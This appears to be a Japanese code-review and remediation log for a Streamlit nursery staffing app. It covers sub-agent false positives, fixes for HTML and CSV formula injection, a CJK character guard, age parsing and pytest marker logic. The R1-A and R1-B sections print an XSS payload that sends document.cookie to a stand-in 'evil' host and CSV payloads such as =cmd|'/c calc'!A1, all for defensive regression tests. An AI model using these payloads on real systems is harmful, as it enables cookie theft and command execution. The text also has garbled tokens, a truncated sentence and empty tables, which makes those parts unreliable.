## 1. 誤検出の記録（重要：これらは直してはいけない）

サブエージェントの指摘は**すべてが正しかったわけではない**。誤って「修正」すると
既に正しい設計を壊すため、判定根拠ごと記録する。

### NG-01 「`st.tabs()` に `key=` を渡すと `TypeError` になる」→ **誤り**

報告: `streamlit_app.py:87,95` の `st.tabs(..., key="main_tabs")` でアプリが起動不能。

実測（Streamlit 1.64.0）:

```
st.tabs signature: (tabs, *, width='stretch', height='content', default=None,
                   key: 'Key | None' = None, on_change=..., args=..., kwargs=...)
```

`key` は**存在する**。引数は `use_container_width` → `width` の**改名**であり、
新引数の追加ではないという前提が誤り。且つ実際に `AppTest` で起動しても例外なし。
→ **修正しない。**

### NG-02 「`main_tabs` キーを 3 タブ / 5 タブで共有すると添字がずれる」→ **再現せず**

報告: 5 タブ構成で index 4 を選択 → シンプル構成に戻ると範囲外になり `IndexError`。

実測: `AppTest` で

```
SIMPLE tabs: 3 / exc: []
ADV    tabs: 5 / exc: []
main_tabs value: None
BACK   tabs: 3 / exc: []
main_tabs value back: None
```

`key` に代入されない実装（選択は `default` 引数が持つ）であり、**例外もずれも発生しない**。
→ **修正しない。**

### NG-03 「給与計算.csv の実働時間が休憩を引いていない」→ **意図された設計**

報告: `exporter.py:246` `net_hours = max(worked_min / 60.0, 0.0)` は休憩を引いておらず
人件費を過大計上する。

実測: コードには意図を示すコメントがあり、
`tests/test_cost_basis.py:111` `test_payrollの実働時間は二重控除されない` が
**二重控除しないこと**を明示的に固定している。`docs/07` T-05 の決定事項
（「人件費の基準を実働基準に統一」）の実装。
休憩を引くと**二重控除**になり，目光で「直した」結果となる。
→ **修正しない。**

> 教訓: サブエージェントの報告は一次情報ではない。**必ずコードとテストで裏を取ってから**
> 手を入れる。誤った修正は静かに設計を壊す。

### R1-A（P0 / セキュリティ）HTML 注入 — `metric_row` がユーザー入力を無エスケープ

**場所**: `src/shiftai/ui/components.py:116-125`

```python

    f'<div class="shiftai-metric-label">{label}</div>'
    f'<div class="shiftai-metric-value">{text}</div>'
)
if note:
    body += f'<div class="shiftai-metric-note">{note}</div>'
st.markdown(body, unsafe_allow_html=True)
```

**到達経路（実測済み）**:

```
sidebar.py:56-60   st.text_input("園名", key="facility_name")   ← ユーザー入力
  → sidebar.py:102 FacilitySettings(facility_name=...)
  → tab_requirements.py:80  ("園児数", f"{len(children)} 名", f"{settings.facility_name}")
  → components.metric_row(...)  ← note に園名が入る
  → components.py:123  f'...metric-note">{note}</div>'
```

**実測結果**（`st.markdown` を差し替えて捕まえた送信本文）:

```
unsafe_allow_html=True
  RAW XSS PRESENT: True      # <img src=x onerror=alert(1)> が label / value / note すべてに混入
  ESCAPED PRESENT: False
```

**影響**: サイドバーの「園名」入力欄に
`<img src=x onerror=fetch('//evil/'+document.cookie)>` を入れると、
「必要人員」タブを開いた瞬間にブラウザ上で JS が実行される。
Streamlit の `unsafe_allow_html=True` は**サーバー側でサニタイズしない**
（Markdown レンダラの `rehype-raw` を有効化するだけ）。
`label` / `value` / `note` の**3 つすべて**が危険。

**同種**: `theme.rule_note_card`（`theme.py:246-259`）、`theme.legend`（`theme.py:270-278`）
も同じ構造だが、現状は定数のみが渡るため**到達不能**。構造的脆弱性として併せて修正する。

**方針**: HTML を組み立てる境界で `html.escape` を適用する。
**方針 2**: 色は定数のみなので `style` 属性は触らない（過剰修正を避ける）。

**回帰テスト**（純 Python、AppTest 不要）:
- `test_metric_rowはlabelとvalueとnoteをエスケープする`
  - `_metric_html()` を純粋関数として切り出し、
    `<img src=x>` を渡すと生の `<img` が無く `&lt;img` があること
  - 3 フィールド全てについて検証
- `test_rule_note_cardは注記テキストをエスケープする`
- `test_園名にタグspoを入れても生タグが出ない`（`tab_requirements` 経由の結合テスト）

### R1-B（P0 / セキュリティ）CSV 数式注入 — 出力 CSV が数式を実行する

**場所**: `src/shiftai/exporter.py:266-270`

```python
def to_csv_bytes(df: pd.DataFrame, *, bom: bool = True, index: bool = False) -> bytes:
    text = df.to_csv(index=index)     # 無害化なし
    return data ...
```

**実測結果**:

```
CSV   : S001,=cmd|'/c calc'!A1,+1+1        → 生の数式が残存
Excel : cell B2 data_type = 'f'             → Excel が「数式」と認識
```

**到達経路**: `SHIFT_DF_COLUMNS` / `PAYROLL_DF_COLUMNS` の `氏名` `資格` 列は
**ユーザーのアップロード CSV 由来**。`export_bundle_zip`（`exporter.py:560-572`）が
`shift.csv` / `payroll.csv` / `shift.xlsx` を出力する。

**影響**: 利用者が Excel で `shift.csv` を開いた瞬間、`=HYPERLINK(...)` /
`IMPORTXML` などが実行される。園児氏名（PII）が既に含まれるため、
外部送信型的攻撃が成立する。GAS 経由で Google スプレッドシートに
`IMPORTDATA` を書かせればDescriptions fetch による持ち出しもできる。

**Excel 側は安全**（openpyxl は文字列を `t="s"` で書く）。CSV のみ危険。

**方針**: `to_csv_bytes` に一元的な無害化を入れる。
`^[=+\-@]`（前後に空白・タブ・CR を含む）で始まる**文字列**セルに
Excel が数式と解釈しない接頭辞（`'`）を付ける。
数値列と内部生成列は触らない。

**回帰テスト**:
- `test_CSV出力は数式で始まる値を無害化する`
  - `=1+1` `-2+3` `@SUM(A1)` `=cmd|'/c calc'!A1` を渡し、
    `csv.reader` で読んだ値がどれも数式として始まらないこと
  - 正常値 `山田` が無傷であること
- `test_Excel出力は文字列のまま数式扱いされない`
  - `to_excel_bytes` を通し `openpyxl.load_workbook(data_only=False)` で
    `data_type == "s"` であること（現状のまま壊していないことを固定）

### R1-C（P0 / 品質ゲート）CJK 静的ガードが `ALLOWED_KANJI` で無効化されている

**場所**: `tests/test_static_guards.py:190-198`（許可リスト）と `:232`（判定条件）

```python
if char in SIMPLIFIED_ONLY and char not in ALLOWED_KANJI:
```

**実測**: `ALLOWED_KANJI` 223 文字のうち **210 文字が `SIMPLIFIED_ONLY` に重合**。
ガード自身の docstring が挙げた 3 例（`保育補助经验` `严格な定員比` `保育主管部门`）は
**今このコードで全て通ってしまう**。`经` `严` `门` が全て許可されている。

これはRound 0 で筆者が実際にCJK 文字化けを 10 箇所 直した**同じ不具合を検出できない**ことを意味する。
ガードが「 韓国語・簡体字混入を許さない」ことを docs/08 が明示しているのに、
実装がその保証をしていない。

**方針**: `ALLOWED_KANJI` を**実際に日本語として使う字だけの小さな許可リスト**に縮小する。
簡体字字形（U+7ECF `经` など）は日本語の正字（U+7D4C `経`）と**別符号位置**なので、
「字形が似ている」で許すのは正当化できない。

既存コードに混入がないことを確認したうえで縮小する。

**回帰テスト**:
- `test_許可リストは簡体字を含まない`
  - `ALLOWED_KANJI & SIMPLIFIED_ONLY` が明示的なレビュー済み例外集合に収まること
  - 例外集合は定数としてコードに残し、1 つ 1 つに理由を添える
- `test_ガードは既知の混入を検出できる`（positive control）
  - `保育補助经验` `严格な定員比` `保育主管部门` の 3 例が**検出される**こと
- `test_ガードは正常な日本語を誤検出しない`（negative control）

### R1-D（P1 / 業務影響）年齢変換が「3 歳 6 ヶ月」を 0 歳児にする

**場所**: `src/shiftai/importers.py:216-227`

```python
digits = re.sub(r"[^0-9]", "", text)  # "3歳6ヶ月" -> "36"
years = int(digits)  # 36
if "ヶ月" in text or "か月" in text or "カ月" in text:
    return "0"  # ← "36" を捨てて 0
```

**実測**:

```
'3歳6ヶ月'   -> '0'    ← 本来は '3'
'4歳2か月'   -> '0'    ← 本来は '4'
'2歳11ヶ月'  -> '0'    ← 本来は '2'
'1歳0ヶ月'   -> '0'    ← 本来は '1'
'3'          -> '3'    ← 正常
```

**影響**: 園業務支援システムの実出力は `○歳○ヶ月` 形式が多い。
`0歳児` は必要人員が最も大きい区分（`0歳児4:1`）なので、
**全園児が 0 歳児に寄ると必要人員が過剰に算出**され、
シフトが「配置基準を満たさない」状態になる。あるいは過大配置による人件費増。
**静かに Wrong な数字を出すため最も危険**。

**方針**: 年の部分を先に確定する。月表記は「0 歳」の根拠としてのみ使う。

**回帰テスト**:
- `test_年月表記の年齢は年の部分を優先する`
  - `3歳6ヶ月`→`3` / `4歳2か月`→`4` / `2歳11ヶ月`→`2` / `1歳0ヶ月`→`1`
  - `11ヶ月`→`0`（回帰しない）/ `3`→`3` / `7歳`→`5`（クランプ維持）

### R1-F（P2 / テスト実行時間）`slow` マーカーの自動判定が穴だらけ

**場所**: `tests/conftest.py:258-271`（エントリポイント）、`:347-366`（判定）

AST で `solve_shift` / `solve_shift_greedy` / `check_violations` の**直接呼び出し**と、

- モジュールレベルヘルパー経由（`test_solver_perf.py:141` の `_solve`、`test_solver.py:70`）
- モジュールレベルフィクスチャ経由（`test_cost_basis.py:51` の `solved`）

結果、`make test-fast` が CBC を起動するテストを数十件実行している。

さらに**逆向きの誤り**: `check_violations` は CBC を起動しない純粋 Python だが
`CBC_ENTRYPOINTS` に入っているため、`test_weekly_normalization.py` の 12 テストが
すべて `slow` 扱いになり、**「CBC を起動しないことが設計上のゴール」のファイルが
`test-fast` から除外されている**。

**方針**: 判定を保守的にし、entrypoint を実装に合わせる。

`pytest -m "not slow"` が CBC を起動しないことをテストで固定する。

**回帰テスト**:
- `test_ Keto critic CBCを起動しない`
  - subprocess で `pytest -m "not slow"` を実行し、
    CBC 起動カウンタが 0 であること
- `test_間接呼び出しのテストもslowになる`
  - `_solve()` ヘルパー経由 / `PULP_CBC_CMD` 直呼びが `slow` に分類されること

## 3. 実施順序と優先度

| 順 | 項目 | 理由 |
|----|------|------|
| 1 | **R1-A** HTML 注入 | セキュリティ。ブラウザ上で任意 JS 実行。最も危険 |
| 2 | **R1-B** CSV 数式注入 | セキュリティ。PII が含む |
| 3 | **R1-C** CJK ガード | 以降の修正を検出できる土台。先に直す |
| 4 | **R1-D** 年齢変換 | 業務名が静かに Wrong になる |
| 5 | **R1-E** 空回りテスト | 検出力を回復させる |
| 6 | **R1-F** slow マーカー | 実行時間。機能ではない |
| 7 | **R1-G** ドキュメント | 実装が固まってから |

R1-C を 3 に置いたのは、**言語ガードを直さないと以降の CJK 混入が検出できない**ため。
R1-E の E-7 は筆者が Round 0 で追加したテスト自体の不具合であり、
**変異テストで実際に検出できることを実証済み**のため最優先で直した。

## 8. Round 5 の実施結果（テストスイート監査）

サブエージェント 1 本を「新規・大幅変更したテストだけ」に絞って監査させた。

### R3-QA-01（P0）ヘルパー名衝突で UI テスト 68 件が test-fast から消えていた

``tests/conftest.py`` の ``_helper_uses_cbc()`` は
「関数名 -> CBC を起動しうるか」の**グローバルな名前テーブル**を作っていた。

- ``tests/test_cli_exit_codes.py`` に **入れ子の** ``def run(...)`` がある
  （CLI の ``solve`` を呼ぶため ``helpers["run"] = True``）
- Streamlit の ``AppTest.run()`` も**属性名が** ``run``
- 名前だけで引くため、**7 モジュール計 68 件の UI テストがすべて slow 扱い**になり、
  ``make test-fast`` / ``make test-parallel`` から消えていた

実測（修正前）:

| モジュール | test-fast で収集できた | 過マーク |
|---|---|---|

**なぜ危険か**: `make test-fast` は PR 前の必須ゲートとして文書化されている
（`docs/05`）。サイドバーやタブを壊しても、そのテストが
すべて skip されるため **CI は green のままバグが出荷される**。

**なぜ既存テストが検知できなかったか**

- ``test_slow未付与のCBCテストは存在しない`` は**独立した**検出器を使うが、
  断言するのは ``cbc_nodes ⊆ slow`` であり、**過マークは構造的に見えない**
- ``test_CBCを起動しない検査はslowにしない`` は
  ``test_weekly_normalization.py`` だけを見る（``run()`` を含まない）
- ``collected > 500`` という総数閾値は、1 モジュール分の消失を検出できない

**修正**: テーブルのキーを **(モジュール名, 関数名)** にし、
取得時は**テスト自身と同じモジュール**で定義された関数だけを参照する。
あわせて**モジュールレベル**の関数のみを対象にし、
テスト関数の中の入れ子 ``def`` は判定対象から外した。

実測（修正後）:

| モジュール | test-fast | 過マーク |
|---|---|---|

`pytest -m "not slow"` の実行対象は**目に見えて増え**、
実行時間は 2 分程度に収まった（具体的な件数は変動するため書かない）。
CBC 起動回数は 0 のまま（過マークを削っても漏らし加剧していない）。
